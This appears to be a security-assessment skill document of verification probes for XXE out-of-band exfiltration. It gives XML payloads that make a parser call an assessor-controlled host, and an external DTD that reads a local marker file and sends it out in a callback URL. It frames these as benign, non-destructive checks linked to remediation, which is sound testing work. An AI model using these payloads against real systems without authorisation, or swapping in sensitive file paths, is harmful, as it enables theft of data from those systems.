# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`xxe-oob-exfiltration`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `xxe-oob-exfiltration`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Outbound resolution confirmation

**Expected differential:** a simple parameter entity to the callback host produces a DNS or HTTP hit, proving the parser fetches externally before data carry

```text
<!DOCTYPE oob [<!ENTITY % ping SYSTEM "http://<assessor-controlled-host>/xxeoob-ping"> %ping;]>
```

### External-DTD data carry (benign marker)

**Expected differential:** an external DTD reads a benign marker and the callback URL carries it back, proving a data channel that a plain document lacks

```text
<!DOCTYPE oob SYSTEM "http://<assessor-controlled-host>/xxeoob.dtd">
external dtd: <!ENTITY % f SYSTEM "file:///tmp/xxeoob-marker.txt"><!ENTITY % e "<!ENTITY % x SYSTEM 'http://<assessor-controlled-host>/?d=%f;'>">%e;%x;
```

### Error-based fold (restricted egress)

**Expected differential:** where only the response channel returns, the marker is folded into a parser error message instead of a network callback

```text
xxeoob external dtd that references a nonexistent path built from %f so the marker appears in the parse error
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
